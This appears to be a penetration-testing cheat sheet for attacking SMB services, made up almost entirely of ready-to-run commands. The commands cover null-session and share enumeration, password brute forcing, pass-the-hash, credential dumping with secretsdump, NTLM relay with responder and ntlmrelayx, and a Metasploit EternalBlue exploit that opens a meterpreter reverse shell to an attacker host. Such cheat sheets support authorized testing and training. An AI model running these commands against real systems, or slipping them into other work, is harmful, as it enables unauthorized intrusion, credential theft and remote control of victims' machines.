# SMB (139, 445)

!!! tip "Start here"
    Check null session first: `netexec smb 10.10.10.10 -u '' -p ''`. If that fails, try `guest:guest`. Null sessions still work on older or misconfigured Windows hosts and give you share listings and sometimes user enumeration.

---

## Enumeration

```bash
nmap -p 445 --script smb-os-discovery,smb-protocols,smb2-security-mode 10.10.10.10
crackmapexec smb 10.10.10.10
enum4linux-ng -A 10.10.10.10
```

---

## Share Enumeration

```bash
smbclient -L //10.10.10.10 -U ''
smbclient -L //10.10.10.10 -U guest
nmap --script smb-enum-shares -p 445 10.10.10.10
crackmapexec smb 10.10.10.10 --shares
```

Connect to a share:

```bash
smbclient //10.10.10.10/ShareName -U <user>
```

Download files once connected:

```bash
smb> get filename
smb> mget *
```

---

## Brute Force

```bash
crackmapexec smb 10.10.10.10 -u users.txt -p passwords.txt
hydra -L users.txt -P passwords.txt smb://10.10.10.10
```

---

## Pass-the-Hash

```bash
crackmapexec smb 10.10.10.10 -u Administrator -H <ntlm-hash>
impacket-smbexec EXAMPLE/Administrator@10.10.10.10 -hashes :<ntlm-hash>
```

---

## Credential Dumping

```bash
secretsdump.py EXAMPLE/<user>@10.10.10.10
secretsdump.py EXAMPLE/<user>@10.10.10.10 -hashes :<ntlm-hash>
```

---

## NTLM Relay

Capture and relay NTLMv2 authentication to SMB:

```bash
responder -I eth0 -rdwv
ntlmrelayx.py -tf targets.txt -smb2support
```

---

## EternalBlue (MS17-010)

```bash
nmap -p 445 --script smb-vuln-ms17-010 10.10.10.10
```

If vulnerable:

```bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.10
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <attacker-ip>
exploit
```

!!! tip "Real-world"
    SMB is usually the first service worth digging into on internal assessments. Start with null/guest sessions, then move to credential spraying. NTLM relay is high-value when you can poison LLMNR — many networks still have LLMNR/NBT-NS enabled and no SMB signing enforced. Check signing with `crackmapexec smb 10.10.10.10 --gen-relay-list relay_targets.txt`.
